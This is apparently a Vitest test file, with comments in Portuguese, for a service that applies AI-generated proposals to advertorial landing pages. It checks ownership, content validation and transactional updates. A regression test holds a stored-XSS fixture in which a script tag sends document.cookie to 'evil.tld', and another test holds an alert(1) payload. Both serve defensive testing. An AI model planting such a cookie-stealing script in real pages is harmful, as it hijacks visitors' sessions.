import { describe, it, expect, vi, beforeEach } from 'vitest';

const { mockPrisma, mockRender } = vi.hoisted(() => ({
  mockPrisma: {
    presellProposal: { findUnique: vi.fn(), update: vi.fn() },
    presell: { findFirst: vi.fn(), update: vi.fn() },
    $transaction: vi.fn(),
  },
  mockRender: vi.fn((_content: unknown, _opts: { customCode?: string }) => '<html>regenerado</html>'),
}));

vi.mock('../prisma', () => ({ prisma: mockPrisma }));
vi.mock('../llm', () => ({ callLLM: vi.fn() }));
vi.mock('../obsidianSync', () => ({ logLearningToObsidian: vi.fn() }));
vi.mock('../presell', () => ({ renderPresellHtml: mockRender }));

import { applyPresellProposal } from '../landingPageProposalService';

const conteudo = {
  categoria: 'Saúde', headline: 'Headline editorial', subheadline: 'Sub', autor: 'Redação',
  leitura_min: 5, abertura: 'Abertura', secao1_titulo: 'S1', secao1_texto: 'T1',
  secao2_titulo: 'S2', secao2_texto: 'T2', beneficios: ['b'], prova: 'p',
  cta_texto: 'cta', cta_reforco: 'ref', secao3_titulo: 'S3', secao3_texto: 'T3',
  pros: ['pro'], contras: ['contra'], faq: [{ pergunta: 'q', resposta: 'r' }],
  cta_final: 'final', titulo_pagina: 'titulo', meta_descricao: 'meta', nome_site: 'site',
};

const presell = {
  id: 'p1', userId: 'u1', productName: 'Produto', hopLink: 'https://hop', pageType: 'advertorial',
  popupGate: false, language: 'pt-BR', googleAdsId: null, videoUrl: null,
  customCode: '<style>/* escrito pelo operador */</style>',
};

describe('applyPresellProposal', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    mockRender.mockReturnValue('<html>regenerado</html>');
    mockPrisma.$transaction.mockResolvedValue([]);
  });

  it('recusa proposta inexistente', async () => {
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce(null);
    await expect(applyPresellProposal('x', 'u1')).rejects.toThrow('Proposta não encontrada.');
  });

  it('recusa aplicar em pre-sell de outro usuário', async () => {
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: false, proposedContent: conteudo, proposedCustomCode: '',
    });
    mockPrisma.presell.findFirst.mockResolvedValueOnce(null);
    await expect(applyPresellProposal('pr1', 'intruso')).rejects.toThrow(/outro usuário/);
    expect(mockPrisma.$transaction).not.toHaveBeenCalled();
  });

  it('bloqueia reaplicação da mesma proposta', async () => {
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: true, proposedContent: conteudo, proposedCustomCode: '',
    });
    // A checagem de ownership roda ANTES da de `applied`, de propósito: sem isso, quem
    // não é dono descobriria pelo texto do erro se uma proposta já foi aplicada.
    mockPrisma.presell.findFirst.mockResolvedValueOnce(presell);

    await expect(applyPresellProposal('pr1', 'u1')).rejects.toThrow('Esta proposta já foi aplicada a esta pre-sell.');
    expect(mockPrisma.$transaction).not.toHaveBeenCalled();
  });

  it('ownership é checado antes de revelar o estado da proposta', async () => {
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: true, proposedContent: conteudo, proposedCustomCode: '',
    });
    mockPrisma.presell.findFirst.mockResolvedValueOnce(null);

    // Intruso recebe "não é seu", nunca "já foi aplicada".
    await expect(applyPresellProposal('pr1', 'intruso')).rejects.toThrow(/outro usuário/);
  });

  it('recusa conteúdo fora do contrato em vez de renderizar "undefined" na página', async () => {
    const { faq, ...parcial } = conteudo;
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: false, proposedContent: parcial, proposedCustomCode: '',
    });
    mockPrisma.presell.findFirst.mockResolvedValueOnce(presell);

    await expect(applyPresellProposal('pr1', 'u1')).rejects.toThrow(/fora do contrato/);
    expect(mockRender).not.toHaveBeenCalled();
    expect(mockPrisma.$transaction).not.toHaveBeenCalled();
  });

  it('NUNCA injeta código de proposta antiga: preserva o customCode do operador', async () => {
    // Regressão do XSS armazenado: registros gravados antes da correção ainda têm
    // proposedCustomCode preenchido. Ele não pode chegar ao HTML publicado.
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: false, proposedContent: conteudo,
      proposedCustomCode: '<script>fetch("https://evil.tld/?c="+document.cookie)</script>',
    });
    mockPrisma.presell.findFirst.mockResolvedValueOnce(presell);

    await applyPresellProposal('pr1', 'u1');

    const opts = mockRender.mock.calls[0][1];
    expect(opts.customCode).toBe(presell.customCode);
    expect(opts.customCode).not.toContain('<script>');
    expect(JSON.stringify(mockRender.mock.calls[0])).not.toContain('evil.tld');
  });

  it('não deixa o customCode legado vazar para o update do banco', async () => {
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: false, proposedContent: conteudo,
      proposedCustomCode: '<script>alert(1)</script>',
    });
    mockPrisma.presell.findFirst.mockResolvedValueOnce(presell);

    await applyPresellProposal('pr1', 'u1');

    expect(mockPrisma.presell.update).toHaveBeenCalledTimes(1);
    const data = mockPrisma.presell.update.mock.calls[0][0].data;
    expect(data.customCode).toBeUndefined();
    expect(data.html).toBe('<html>regenerado</html>');
  });

  it('grava conteúdo e marca applied na mesma transação', async () => {
    mockPrisma.presellProposal.findUnique.mockResolvedValueOnce({
      id: 'pr1', presellId: 'p1', applied: false, proposedContent: conteudo, proposedCustomCode: '',
    });
    mockPrisma.presell.findFirst.mockResolvedValueOnce(presell);

    await applyPresellProposal('pr1', 'u1');

    expect(mockPrisma.$transaction).toHaveBeenCalledTimes(1);
    expect(mockPrisma.presellProposal.update.mock.calls[0][0].data.applied).toBe(true);
  });
});
